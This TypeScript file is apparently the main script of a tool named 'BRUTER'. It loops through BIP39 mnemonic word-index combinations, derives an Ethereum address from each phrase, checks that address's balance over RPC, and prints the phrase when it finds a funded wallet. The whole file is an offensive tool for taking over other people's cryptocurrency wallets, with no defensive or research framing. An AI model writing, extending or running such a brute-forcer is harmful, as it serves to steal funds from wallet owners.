import { EthereumProvider, EthereumOptions } from "./ethereum";
import { MnemonicProvider } from "./mnemonic";

import { ETH_RPC } from "./utlis/config";

async function bootstrap() {
    console.log('Starting BRUTER');
    const options: EthereumOptions = {
        url: ETH_RPC
    }
    const mnemonicProvider = new MnemonicProvider();
    const ethProvider = new EthereumProvider(options);
    let phase = [879,568,11,346,1235,546,909,567,519,10,161,395]
    try {
        while (true) {
            console.time('bruter');
            const mnemonic = mnemonicProvider.getPhrase(phase);
            const address = ethProvider.addressFromMnemonic(mnemonic);
            const balance = await ethProvider.getBalanceByAddress(address);
            console.timeEnd('bruter');
            // console.table({address: address, balance: balance.toString()})
            if (balance.gt(0)) {
                console.log(mnemonic);
                process.exit(1)
            }
            phase=mnemonicProvider.getNextIndex(phase)
            console.log(JSON.stringify(phase));
            
        }
    } catch (error) {
        console.log(phase);
        console.log(error);
    }
}
bootstrap()